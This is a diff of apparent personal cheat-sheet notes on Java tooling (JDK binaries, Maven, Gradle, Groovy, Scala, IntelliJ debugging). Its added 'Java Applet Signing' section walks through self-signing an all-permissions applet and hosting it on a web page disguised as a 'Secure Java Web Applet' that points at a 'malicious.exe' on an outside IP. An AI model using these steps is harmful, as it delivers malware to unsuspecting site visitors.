@@ -1,6 +1,9 @@
 JAVA
 
 tool-chain
+	Java
+	/usr/lib/jvm/java-11-openjdk-amd64/bin/
+	/usr/lib/jvm/java-11-openjdk-amd64/jre/bin/
 java -version
 java -jar java.jar
 java -cp nomain.jar class.function -t flag
@@ -8,6 +11,102 @@ javac ajar.java
 	-compile ajar.class file as bytecode
 jad java.class
 	-decompile bytecode to source
+appletviewer
+clhsdb
+extcheck
+hsdb
+idlj
+jar
+jarsigner
+jaotc
+javah
+javap
+jcmd
+jconosole
+jdb
+jdeprscan
+jdeps
+jexec
+jhat
+jhsdb
+jimage
+jinfo
+jjs
+jlink
+jmap
+jmod
+jps
+jrunscript
+jsadebugd
+jshell
+jstack
+jstat
+jstatd
+keytool
+native2ascii
+ordb
+pack200
+policytool
+rmic
+rmid
+rmiregistry
+schemagen
+serialver
+servertool
+tnameserv
+unpack200
+wsgen
+wsimport
+xjc
+	Maven
+	/usr/share/maven/bin/
+mvn
+mvnDebug
+mvnyjp
+maven-cache-cleanup
+	Gradle
+	/usr/share/gradle/bin/
+gradle
+	Groovy
+groovy
+groovyc
+groovyConsole
+groovysh
+java2groovy
+startGroovy
+	Scala
+scala
+	--interperter & script runner
+scalac
+	--compiler
+fsc
+	--offline compiler
+scaladoc
+	--source-scanning documentation generator
+
+	
+	
+Java Applet Signing
+	javac -source 1.8 -target 1.8 target.java
+		--compile java source using target Java language standards version source compatible with specified release to be bytecode-compiled for JVM version compatability specified by target as .class file
+			javac -version
+				--check versioning information for latest JVM version supported up to by local javac compiler instance
+	touch manifest.txt
+		--create manifest file
+	echo “Permissions: all-permissions” > manifest.txt
+		--configure manifest with full permissions
+	jar cvf target.jar target.class
+		--create jar archive file from bytecode-compiled class file (compiled by javac)
+		--manifest file implied
+		-c create new archive
+		-f  specify archive file name
+		Usage: jar {ctxui}[vfmn0PMe] [jar-file] [manifest-file] [entry-point] [-C dir] files
+	keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
+	jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedTarget.jar target.jar signapplet
+	Host as web application:
+	cp target.class SignedTarget.jar /var/www/html/
+	echo '<applet width="1" height="1" id="Secure Java Web Applet" code="target.class" archive="SignedTarget.jar"><param name="1" value="http://111.11.1.11/malicious.exe"></applet>' > /var/www/html/java.html
+	
 	
 MAVEN
 mvn clean package -DskipTests
@@ -26,6 +125,13 @@ gradle check
 gradle assemble
 gradle build
 gradle scan
+
+
+Java Debugging (Intellij Idea)
+Run>Debug>Edig Configuration
+>+>Maven
+jetty:run -f pom.xml
+set breakpoint on method execution
 
 
 
